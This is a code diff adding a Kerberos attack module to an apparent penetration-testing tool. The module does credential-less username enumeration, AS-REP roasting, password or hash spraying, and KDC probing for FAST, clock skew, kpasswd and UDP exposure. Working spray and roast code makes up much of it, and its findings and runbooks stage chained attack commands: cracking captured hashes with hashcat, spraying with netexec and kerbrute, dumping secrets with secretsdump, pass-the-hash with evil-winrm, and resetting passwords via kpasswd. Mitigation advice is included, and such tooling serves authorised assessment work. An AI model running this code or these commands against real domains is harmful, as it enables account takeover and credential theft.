+        return {"user": user, "state": "error"}
+    if tag == 0x6B:                                # [APPLICATION 11] AS-REP -> creds valid
+        return {"user": user, "state": "success"}
+    code = _kdc_error_code(reply)
+    if code is None:
+        return {"user": user, "state": "error"}
+    if code == KDC_ERR_PREAUTH_FAILED:
+        return {"user": user, "state": "bad_password", "code": code}
+    if code in (KDC_ERR_CLIENT_REVOKED, KDC_ERR_KEY_EXPIRED):
+        return {"user": user, "state": "locked", "code": code}
+    if code == KDC_ERR_PRINCIPAL_UNKNOWN:
+        return {"user": user, "state": "unknown_user", "code": code}
+    return {"user": user, "state": "error", "code": code}
+
+
+def spray(dc_ip: str, realm: str, users: list[str], password: str = "",
+          nthash: str = "", timeout: float = _TIMEOUT,
+          stop_on_lockout: bool = True) -> list[dict]:
+    """Spray one password/hash across a user list. Stops on the first 'locked'
+    when stop_on_lockout (default): a locked account is a red flag that
+    further attempts will worsen it."""
+    out: list[dict] = []
+    for u in users:
+        r = spray_user(dc_ip, realm, u, password=password, nthash=nthash,
+                       timeout=timeout)
+        out.append(r)
+        if stop_on_lockout and r["state"] == "locked":
+            break
+    return out
+
+
+def _parse_krbtime_epoch(s: str) -> int:
+    import calendar
+    return calendar.timegm(time.strptime(s, "%Y%m%d%H%M%SZ"))
+
+
+def kdc_probe(dc_ip: str, realm: str, user: str = "krbtgt",
+              timeout: float = _TIMEOUT) -> dict:
+    """One pre-auth-less AS-REQ, mine the KRB-ERROR reply. Returns
+    {reachable, code?, crealm, stime, skew_seconds, has_fast, padata_types,
+     fast_value_hex}.
+    'skew_seconds' is (local_wall_time - kdc_stime); 'has_fast' means the KDC
+    advertised PA-FX-FAST (136) so pre-auth spraying against this account is
+    armoured. 'fast_value_hex' is the hex-encoded PA-FX-FAST padata VALUE
+    octet-string (RFC 6113 §5.4.2 PA-FX-FAST-REPLY, empty when the KDC only
+    advertised the type or FAST is not enforced) — T2 wire evidence that the
+    KDC really runs FAST end-to-end rather than merely listing the code."""
+    out: dict = {"reachable": False, "code": None, "crealm": "",
+                 "stime": "", "skew_seconds": None,
+                 "has_fast": False, "padata_types": [],
+                 "fast_value_hex": ""}
+    sent_at = int(time.time())
+    reply = _send_recv(dc_ip, build_as_req(user, realm.upper()), timeout)
+    if not reply:
+        return out
+    out["reachable"] = True
+    try:
+        tag, body, _ = _read_tlv(reply, 0)
+        _t, seq, _ = _read_tlv(body, 0)
+    except (ValueError, IndexError):
+        return out
+    if tag != 0x7E:                                # not a KRB-ERROR — nothing to mine
+        return out
+    err = _ctx_inner(seq, 6)
+    out["code"] = int.from_bytes(err, "big") if err else None
+    st = _ctx_inner(seq, 4)                        # stime [4] KerberosTime
+    if st:
+        try:
+            s = st.decode("ascii")
+            out["stime"] = s
+            out["skew_seconds"] = sent_at - _parse_krbtime_epoch(s)
+        except (ValueError, UnicodeDecodeError):
+            pass
+    cr = _ctx_inner(seq, 9)                        # crealm [9] Realm (GeneralString)
+    if cr:
+        out["crealm"] = cr.decode("utf-8", "replace")
+    pa_entries = _extract_padata(seq)
+    types = [t for t, _v in pa_entries]
+    out["padata_types"] = types
+    out["has_fast"] = _PADATA_FX_FAST in types
+    # Capture the PA-FX-FAST padata VALUE bytes — RFC 6113 PA-FX-FAST-REPLY.
+    # A non-empty value is strong wire evidence that the KDC actually
+    # implements FAST rather than merely advertising the padata type number.
+    for t, v in pa_entries:
+        if t == _PADATA_FX_FAST and v:
+            out["fast_value_hex"] = v.hex()
+            break
+    return out
+
+
+# --- narratives + findings ------------------------------------------------------
+
+_NARRATIVE = {
+    "asrep_roast": (
+        "The account has Kerberos pre-authentication disabled (DONT_REQ_PREAUTH), so "
+        "recce requested an AS-REP for it with NO credential and captured the encrypted "
+        "blob - a crackable hash. Crack it offline (hashcat -m 18200) to recover the "
+        "account's real password, then reuse it: a single roastable service or admin "
+        "account is often the first foothold in the domain. Require Kerberos pre-auth on "
+        "every account (clear DONT_REQ_PREAUTH) and use long random passwords."),
+    "user_enum": (
+        "The domain controller answers AS-REQs differently for valid and invalid "
+        "usernames (PREAUTH_REQUIRED vs PRINCIPAL_UNKNOWN), so recce validated real "
+        "usernames from a wordlist with no credential and no logon attempt (no "
+        "lockouts). A confirmed user list is the input for password spraying, AS-REP / "
+        "Kerberoasting, and targeted phishing."),
+    "kerberos_spray_success": (
+        "recce sprayed a candidate password with a pre-authenticated AS-REQ and the KDC "
+        "returned an AS-REP - the credential is valid. The failure event on the DC is "
+        "4771 (Kerberos pre-auth failed), NOT 4625 (logon failure), and by default this "
+        "does not increment the SMB lockout counter. Use the credential immediately for "
+        "lateral movement, and mitigate by enforcing Kerberos FAST (PA-FX-FAST), auditing "
+        "4771 volume, and counting 4771 in lockout policy alongside 4625."),
+    "kerberos_fast_enforced": (
+        "The KDC advertised PA-FX-FAST (RFC 6113 padata type 136) in its KRB-ERROR reply "
+        "- pre-auth is armoured, so PA-ENC-TIMESTAMP spraying is defeated and no "
+        "PA-ETYPE-INFO2 salt/etype leakage. AS-REP roasting of DONT_REQ_PREAUTH accounts "
+        "remains the only credential-less Kerberos path against this KDC."),
+    "kdc_time_skew": (
+        "The KDC's stime differs from the tester's wall clock by more than five minutes "
+        "(the default Kerberos skew tolerance). Kerberos AS/TGS exchanges will fail with "
+        "KRB_AP_ERR_SKEW; a DC drifting off NTP is also an attacker-controlled DHCP/NTP "
+        "opportunity. Verify the DC's NTP source and monitor time-service events."),
+    "kpasswd_exposed": (
+        "TCP/464 (kpasswd, RFC 3244) is reachable on the DC. The Microsoft set-password "
+        "variant needs ONLY a valid TGT and the target principal - no old password - so "
+        "any cracked AS-REP hash, sprayed credential, or forged ticket can rewrite an "
+        "account's password. Restrict kpasswd to management networks and audit set-password "
+        "events (4724 on AD DCs) alongside logon events."),
+    "kerberos_udp_fallback": (
+        "The KDC answered a pre-auth-less AS-REQ over UDP/88 (RFC 4120 sec 7.2.1). Firewalls that "
+        "permit UDP/88 but drop TCP/88 currently read as 'no KDC' to TCP-only clients, "
+        "and KRB_ERR_RESPONSE_TOO_BIG (52) on UDP is a reliable AD-vs-MIT fingerprint. "
+        "Align UDP/88 and TCP/88 in the firewall policy so hardening a single transport "
+        "does not create a silent bypass."),
+}
+
+
+TESTING_NARRATIVE = [
+    ("1. Kerberos client (stdlib ASN.1 DER)",
+     "recce builds a Kerberos AS-REQ by hand - no impacket - and speaks it to the DC "
+     "over TCP 88. It needs no credential."),
+    ("2. AS-REP roasting (no credential)",
+     "For each candidate user it sends an AS-REQ with no pre-authentication. If the DC "
+     "returns an AS-REP, the account has pre-auth disabled and recce captures the "
+     "encrypted part as a $krb5asrep$ hash to crack offline (hashcat -m 18200)."),
+    ("3. Username enumeration (no lockouts)",
+     "A KDC_ERR_PREAUTH_REQUIRED reply means the username is valid; "
+     "KDC_ERR_C_PRINCIPAL_UNKNOWN means it does not exist. recce only requests "
+     "tickets - it never attempts a logon, so nothing is locked out."),
+    ("4. Runbook",
+     "The exact follow-on commands (hashcat -m 18200, GetNPUsers, a spray with the "
+     "confirmed user list) are staged."),
+]
+
+
+_finding = finding_builder("kerberos", _NARRATIVE)
+
+
+def findings(dc_ip: str, realm: str, results: list[dict],
+             privileged: set | None = None) -> list[dict]:
+    privileged = {p.lower() for p in (privileged or set())}
+    out: list[dict] = []
+    tgt = f"{dc_ip}:88"
+    roasted = [r for r in results if r["state"] == "roastable"]
+    for r in roasted:
+        priv = r["user"].lower() in privileged
+        et = r.get("etype")
+        # etype 23 (RC4) is the classic hashcat -m 18200 hash; an AES AS-REP (17/18,
+        # issued when RC4 is disabled) is still roastable but cracks with john's
+        # krb5asrep format, not -m 18200 - say so honestly.
+        if et == 23:
+            crack = f"hashcat -m 18200 asrep.hash rockyou.txt   # {r['user']}@{realm}"
+        else:
+            crack = (f"john --format=krb5asrep asrep.hash   # AES AS-REP (etype {et}), "
+                     "not hashcat -m 18200")
+        out.append(_finding(
+            "critical" if priv else "high",
+            "AS-REP roastable account (pre-auth disabled)"
+            + (" - privileged" if priv else ""),
+            tgt,
+            f"{r['user']}@{realm} has DONT_REQ_PREAUTH set; recce captured a live "
+            f"AS-REP (etype {et}) with no credential. Crack it offline for the "
+            f"plaintext password.\n\n{r.get('hash', '')}",
+            "hashcat" if et == 23 else "john",
+            crack,
+            "Require Kerberos pre-authentication on the account (clear DONT_REQ_PREAUTH) "
+            "and enforce a long random password.",
+            ["CWE-262"], kind="asrep_roast",
+            exploit_note=(
+                "Copy the $krb5asrep$ line from the finding into asrep.hash; "
+                "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt; on "
+                "crack, feed the password back via nxc smb <dc> -u <user> "
+                "-p '<pass>' --local-auth first, then domain auth."),
+            depth_tier="t2"))
+    valid = [r for r in results if r["state"] in ("valid", "locked", "roastable")]
+    if valid:
+        names = ", ".join(r["user"] for r in valid[:15])
+        # Any confirmed username is a direct feed to password spraying — the
+        # attack that survives every lockout policy when kept lockout-safe.
+        # Bump severity as the confirmed list grows: 1 user = medium (proof
+        # of enumeration), >=3 users = high (spray surface), >=10 users =
+        # critical (systematic name-oracle worth immediate mitigation).
+        if len(valid) >= 10:
+            sev = "critical"
+        elif len(valid) >= 3:
+            sev = "high"
+        else:
+            sev = "medium"
+        out.append(_finding(
+            sev, "Kerberos username enumeration (no credential)", tgt,
+            f"The DC confirmed {len(valid)} valid username(s) with no credential and no "
+            f"logon attempt (no lockouts): {names}. This user list feeds spraying, "
+            "AS-REP / Kerberoasting and phishing.",
+            "kerbrute / GetNPUsers",
+            # shlex.quote the server-supplied realm (attacker-controlled).
+            f"impacket-GetNPUsers {shlex.quote(realm)}/ -no-pass -usersfile users.txt -dc-ip {dc_ip}",
+            "Username enumeration via Kerberos pre-auth is largely inherent; minimise "
+            "predictable names, monitor AS-REQ volume, and alert on pre-auth-disabled "
+            "accounts.",
+            ["CWE-204"], kind="user_enum",
+            exploit_note=(
+                "impacket-GetNPUsers <REALM>/ -no-pass -usersfile users.txt "
+                "-dc-ip <ip>; then kerbrute passwordspray -d <realm> --dc <ip> "
+                "users.txt 'Winter2025!' (or run recce's spray)."),
+            depth_tier="t1"))
+    return out
+
+
+# --- runbook + proof + analyze --------------------------------------------------
+
+def runbook(dc_ip: str, realm: str) -> list[dict]:
+    steps = [
+        ("enumerate", "GetNPUsers", f"impacket-GetNPUsers {realm}/ -no-pass "
+         f"-usersfile users.txt -dc-ip {dc_ip} -format hashcat",
+         "AS-REP roast every pre-auth-disabled user with no credential."),
+        ("crack", "hashcat", "hashcat -m 18200 asrep.hash rockyou.txt",
+         "Recover the plaintext password from a captured AS-REP."),
+        ("spray", "netexec", f"netexec smb {dc_ip} -u users.txt -p '<cracked>' "
+         "--continue-on-success",
+         "Reuse a cracked/likely password across the confirmed user list."),
+    ]
+    return [{"phase": ph, "tool": t, "command": c, "why": w}
+            for ph, t, c, w in steps]
+
+
+def proof_html(command, output, banner: str = "") -> str:
+    from ..services.db import mssql
+    return mssql.proof_html(command, output, prompt="$ ", banner=banner)
+
+
+def findings_to_vulns(fs: list[dict]) -> dict:
+    from ..services.svccommon import findings_to_vulns as _f2v
+    return _f2v(fs, "kerberos", _PORT)
+
+
+def analyze(hosts: list[Host], users: list[str] | None = None,
+            realm: str = "", dc_ip: str = "", privileged: set | None = None,
+            active: bool = True, max_users: int = 1500,
+            budget: float | None = None, progress=None) -> dict:
+    """Full credential-less roast/enum. `users` defaults to enumerated account names;
+    `realm`/`dc_ip` fall back to derived domains / a host with 88 open. `budget` caps
+    wall-clock seconds; `progress(i, n, user)` fires per AS-REQ. Returns
+    {dc_ip, realm, results, findings, runbooks, stats}."""
+    from .. import ad
+    from ..services import svcprobe
+    dc_ip = dc_ip or dc_ip_for(hosts)
+    if not realm:
+        # Prefer the cross-service known_domains reader: it unions LDAP
+        # defaultNamingContext, NTLM AV pairs, BloodHound, and per-cred
+        # domains — ad.derive_domains() only sees NSE + NTLM. Fall back
+        # to derive_domains only when the reader turns up nothing.
+        from ..core.known_domains import kerberos_realm
+        realm = kerberos_realm([h for h in hosts if h.is_up])
+        if not realm:
+            doms = ad.derive_domains([h for h in hosts if h.is_up])
+            realm = (doms[0].name if doms else "").upper()
+    users = users or candidate_users(hosts)
+    # If we STILL have no candidates (no LDAP/AD enum run yet), fall back to
+    # the well-known list so a tester who runs `recce kerberos` first-thing
+    # still gets a meaningful result. Merges with candidate_users() rather
+    # than replacing, so an enumerated list stays authoritative.
+    if not users:
+        users = well_known_users()
+    users = users[:max_users]
+    results: list[dict] = []
+    state: dict = {}
+    if active and dc_ip and realm and users:
+        for _u, r in svcprobe.iter_probe(
+                users, lambda u: roast_user(dc_ip, realm, u),
+                budget=budget, progress=progress, state=state):
+            results.append(r)
+    fs = findings(dc_ip, realm, results, privileged) if results else []
+    return {"dc_ip": dc_ip, "realm": realm, "results": results, "findings": fs,
+            # `targets` lets _service_module_coverage credit the DC as scanned even
+            # when nothing was roastable (no folded vuln would otherwise mark it).
+            "targets": [{"ip": dc_ip, "port": 88}] if dc_ip else [],
+            "runbooks": [{"target": f"{dc_ip}:88", "ip": dc_ip,
+                          "credfree": runbook(dc_ip, realm), "credentialed": []}]
+            if dc_ip else [],
+            "stats": {"users_tested": len(results),
+                      "roastable": sum(1 for r in results if r["state"] == "roastable"),
+                      "valid": sum(1 for r in results
+                                   if r["state"] in ("valid", "locked", "roastable")),
+                      "findings": len(fs), "stopped": state.get("stopped")}}
+
+
+def spray_findings(dc_ip: str, realm: str, results: list[dict],
+                   privileged: set | None = None) -> list[dict]:
+    """One finding per spray success. Critical when the successful user is in
+    `privileged`, else high. Locked-account outcomes emit a medium-severity
+    'account locked during spray' finding so the operator sees they hit a
+    lockout wall."""
+    privileged = {p.lower() for p in (privileged or set())}
+    out: list[dict] = []
+    tgt = f"{dc_ip}:88"
+    for r in results:
+        if r.get("state") != "success":
+            continue
+        priv = r["user"].lower() in privileged
+        out.append(_finding(
+            "critical" if priv else "high",
+            "Kerberos pre-auth spray recovered a valid credential"
+            + (" - privileged" if priv else ""),
+            tgt,
+            f"{r['user']}@{realm} accepted the sprayed password/hash - the KDC "
+            "returned an AS-REP. Failure event is 4771 (Kerberos pre-auth "
+            "failed), not 4625, and does not increment the SMB lockout counter "
+            "under default policy. Use the credential now.",
+            "impacket-getTGT / netexec",
+            f"impacket-getTGT {shlex.quote(realm)}/{shlex.quote(r['user'])}:'<password>'"
+            f" -dc-ip {dc_ip}",
+            "Enforce Kerberos FAST (PA-FX-FAST) armouring; monitor 4771 volume "
+            "on the DC; count 4771 in the account lockout policy alongside "
+            "4625; enforce unique long passwords.",
+            ["CWE-521", "CWE-307"], kind="kerberos_spray_success",
+            exploit_note=(
+                "impacket-getTGT <realm>/<user>:'<pass>' -dc-ip <ip>; "
+                "export KRB5CCNAME=<user>.ccache; then impacket-secretsdump "
+                "-k -no-pass <target>; then evil-winrm -i <target> -u <user> "
+                "-H <nt>."),
+            depth_tier="t3"))
+    return out
+
+
+def kdc_probe_findings(dc_ip: str, probe: dict,
+                       skew_threshold: int = 300) -> list[dict]:
+    """Turn a kdc_probe() result into findings. FAST-enforced KDC -> medium
+    informational (spraying is defeated, AS-REP roasting only). Clock skew
+    over `skew_threshold` (default 300s, the RFC 4120 default tolerance) ->
+    medium."""
+    out: list[dict] = []
+    if not probe.get("reachable"):
+        return out
+    tgt = f"{dc_ip}:88"
+    if probe.get("has_fast"):
+        # T2 promotion: if the KRB-ERROR reply carried a non-empty PA-FX-FAST
+        # padata VALUE (RFC 6113 §5.4.2 PA-FX-FAST-REPLY), we have direct wire
+        # evidence the KDC really runs FAST rather than merely advertising the
+        # type number. Fold the first bytes of that octet-string into the
+        # finding's detail and mark the tier accordingly. Absent that value,
+        # the earlier "type 136 seen" observation still holds at T1.
+        fast_hex = probe.get("fast_value_hex", "") or ""
+        if fast_hex:
+            # Trim the on-screen slice so a large FAST cookie does not
+            # dominate the finding; the full value is still available on the
+            # probe dict for downstream tooling.
+            preview = fast_hex[:128] + ("..." if len(fast_hex) > 128 else "")
+            detail = (
+                "The KDC advertised PA-FX-FAST (RFC 6113 padata type 136) "
+                "AND returned a non-empty PA-FX-FAST-REPLY octet-string in "
+                "the KRB-ERROR e-data — direct wire evidence the KDC "
+                "actually runs FAST (armored pre-auth) end-to-end. Pre-auth "
+                "spraying (PA-ENC-TIMESTAMP) is defeated for accounts "
+                "reached this way; AS-REP roasting of DONT_REQ_PREAUTH "
+                "accounts remains the only credential-less path.\n\n"
+                f"PA-FX-FAST value ({len(fast_hex) // 2} bytes, hex): "
+                f"{preview}")
+            tier = "t2"
+        else:
+            detail = (
+                "The KDC advertised PA-FX-FAST (RFC 6113 padata type 136). "
+                "Pre-auth spraying (PA-ENC-TIMESTAMP) is defeated for "
+                "accounts reached this way; AS-REP roasting of "
+                "DONT_REQ_PREAUTH accounts remains the only "
+                "credential-less path.")
+            tier = "t1"
+        out.append(_finding(
+            "medium",
+            "Kerberos KDC enforces FAST (pre-auth armouring)",
+            tgt,
+            detail,
+            "kerbrute", f"kerbrute userenum -d '<realm>' --dc {dc_ip} users.txt",
+            "This is defensive posture; no action needed - note the constraint "
+            "when planning credential-less attacks against this DC.",
+            ["CWE-693"], kind="kerberos_fast_enforced",
+            exploit_note=(
+                "None - AS-REP roast of DONT_REQ_PREAUTH accounts is the only "
+                "remaining credless path; run recce kerberos and rely on that "
+                "finding class."),
+            depth_tier=tier))
+    skew = probe.get("skew_seconds")
+    if skew is not None and abs(skew) >= skew_threshold:
+        out.append(_finding(
+            "medium",
+            "Kerberos KDC clock skew exceeds tolerance",
+            tgt,
+            f"KDC stime={probe.get('stime')} differs from tester wall clock by "
+            f"{skew} second(s) (threshold {skew_threshold}s). Kerberos "
+            "AS/TGS exchanges will fail with KRB_AP_ERR_SKEW; a DC drifting "
+            "off NTP is also an attacker-controlled DHCP/NTP opportunity.",
+            "ntpdate / w32tm",
+            f"w32tm /monitor /computers:{dc_ip}",
+            "Verify the DC's NTP source and monitor time-service events.",
+            ["CWE-200", "CWE-208"], kind="kdc_time_skew",
+            exploit_note=(
+                "sudo ntpdate <dc-ip> (sync to DC clock); or use faketime for the "
+                "impacket call: faketime '<kdc-stime>' impacket-getTGT ..."),
+            depth_tier="t1"))
+    return out
+
+
+# --- kpasswd exposure probe (TCP/464, RFC 3244) ---------------------------------
+# The Kerberos password-change protocol on port 464 is often stood up alongside
+# the KDC on 88. Its Microsoft set-password variant (impacket's changepasswd.py
+# after AS-REP roast / noPac) needs ONLY a valid TGT and the target principal
+# to rewrite an account's password — no old password. Operators need to know
+# when 464 is exposed so they can plan for that pivot. The probe is a bare
+# TCP connect: no bytes are sent, no state is changed, no auth is attempted.
+# A completed handshake proves the port speaks on this DC.
+
+_KPASSWD_PORT = 464
+
+
+def _kpasswd_reachable(dc_ip: str, timeout: float) -> bool:
+    """Return True if a TCP connect to `dc_ip:464` completes within `timeout`.
+    Isolated so tests monkeypatch this without opening real sockets."""
+    from ..core import proxy
+    try:
+        sock = socket.create_connection((dc_ip, _KPASSWD_PORT),
+                                        timeout=proxy.scaled(timeout))
+    except OSError:
+        return False
+    try:
+        return True
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+def kpasswd_probe(dc_ip: str, timeout: float = _TIMEOUT) -> dict:
+    """One TCP connect to port 464. Returns {reachable: bool}. No bytes are
+    sent — a completed connect is proof enough that the KDC exposes the
+    kpasswd service."""
+    return {"reachable": _kpasswd_reachable(dc_ip, timeout)}
+
+
+def kpasswd_findings(dc_ip: str, probe: dict) -> list[dict]:
+    """Emit a medium finding when kpasswd is reachable on the DC — RFC 3244
+    set-password is the standard post-crack pivot (impacket changepasswd)."""
+    if not probe.get("reachable"):
+        return []
+    tgt = f"{dc_ip}:{_KPASSWD_PORT}"
+    return [_finding(
+        "medium",
+        "Kerberos kpasswd service exposed (port 464)",
+        tgt,
+        "TCP 464 (kpasswd) is reachable on the DC. RFC 3244 defines a "
+        "Microsoft set-password variant that needs ONLY a valid TGT and the "
+        "target principal (no old password) — the exact primitive impacket's "
+        "changepasswd.py uses after AS-REP-roasting or noPac. Any cracked, "
+        "sprayed, or forged TGT can rewrite the account's password.",
+        "impacket-changepasswd",
+        f"impacket-changepasswd '<realm>/<user>@{dc_ip}' -newpass 'NewPass1!' "
+        "-reset",
+        "Restrict kpasswd exposure to management networks; audit set-password "
+        "events (4724 on AD DCs); tighten delegation on service accounts so a "
+        "captured TGT cannot rotate their passwords silently.",
+        ["CWE-306"], kind="kpasswd_exposed",
+        exploit_note=(
+            "Roast or spray a TGT for a service account, then "
+            "impacket-changepasswd '<realm>/<user>@<dc>' -newpass 'X!' -reset "
+            "against port 464 to rewrite the account password without knowing "
+            "the current one."),
+        depth_tier="t1")]
+
+
+# --- UDP transport probe (RFC 4120 sec 7.2.1) ---------------------------------------
+# _send_recv is TCP-only. A firewall that permits UDP/88 but drops TCP/88
+# currently reads as 'no KDC' to recce. Sending the same pre-auth-less AS-REQ
+# over UDP is the transport-fallback check; a KDC that answers over UDP is
+# reachable and the KRB-ERROR reply is mineable. If the KDC returns
+# KRB_ERR_RESPONSE_TOO_BIG (52) that is a well-known AD-vs-MIT fingerprint
+# (RFC 4120 sec 7.2.1 requires the client retry over TCP for oversized replies).
+
+KRB_ERR_RESPONSE_TOO_BIG = 52
+
+
+def _send_recv_udp(dc_ip: str, payload: bytes, timeout: float) -> bytes | None:
+    """Kerberos over UDP: raw datagram, no 4-byte length prefix (RFC 4120 sec 7.2.1).
+    Isolated for tests: fixtures monkeypatch this without touching a real socket."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    except OSError:
+        return None
+    try:
+        sock.settimeout(timeout)
+        sock.sendto(payload, (dc_ip, _PORT))
+        data, _addr = sock.recvfrom(65535)
+        return data
+    except OSError:
+        return None
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+def udp_transport_probe(dc_ip: str, realm: str, user: str = "krbtgt",
+                        timeout: float = _TIMEOUT) -> dict:
+    """One pre-auth-less AS-REQ over UDP/88. Returns
+    {reachable, code?, too_big}. `too_big` is KRB_ERR_RESPONSE_TOO_BIG (52) —
+    the AD-vs-MIT fingerprint. No auth is attempted; the primitive is the same
+    AS-REQ user_enum already sends over TCP, just via UDP."""
+    from ..core import proxy
+    out: dict = {"reachable": False, "code": None, "too_big": False}
+    payload = build_as_req(user, realm.upper())
+    reply = _send_recv_udp(dc_ip, payload, proxy.scaled(timeout))
+    if not reply:
+        return out
+    out["reachable"] = True
+    code = _kdc_error_code(reply)
+    if code is not None:
+        out["code"] = code
+        out["too_big"] = code == KRB_ERR_RESPONSE_TOO_BIG
+    return out
+
+
+def udp_transport_findings(dc_ip: str, probe: dict) -> list[dict]:
+    """Emit a medium finding when the KDC answers over UDP/88 — transport
+    fallback that TCP-only tools miss, and the too-big oracle is an AD-vs-MIT
+    fingerprint."""
+    if not probe.get("reachable"):
+        return []
+    tgt = f"{dc_ip}:88"
+    detail = ("The KDC answered a pre-auth-less AS-REQ over UDP/88 "
+              "(RFC 4120 sec 7.2.1). Firewalls that permit UDP/88 but drop TCP/88 "
+              "read as 'no KDC' to TCP-only clients (recce's default path), so "
+              "a UDP-reachable KDC is a silent bypass of a TCP-only firewall "
+              "policy.")
+    if probe.get("too_big"):
+        detail += (" The KDC returned KRB_ERR_RESPONSE_TOO_BIG (52) — a "
+                   "well-known AD-vs-MIT fingerprint; RFC 4120 sec 7.2.1 requires "
+                   "the client to retry over TCP for oversized replies.")
+    return [_finding(
+        "medium",
+        "Kerberos KDC reachable over UDP/88 (transport fallback)",
+        tgt,
+        detail,
+        "nmap",
+        f"nmap -sU -p 88 --script krb5-enum-users {dc_ip}",
+        "Align UDP/88 and TCP/88 in the firewall policy; if TCP-only is "
+        "intended, block UDP/88 so hardening one transport does not leave "
+        "the other open.",
+        ["CWE-693"], kind="kerberos_udp_fallback",
+        exploit_note=(
+            "When TCP/88 is filtered, retry Kerberos enumeration via UDP: "
+            "nmap -sU -p 88 --script krb5-enum-users <dc>, or force impacket "
+            "onto UDP transport, to reach a DC that TCP-only tools miss."),
+        depth_tier="t1")]
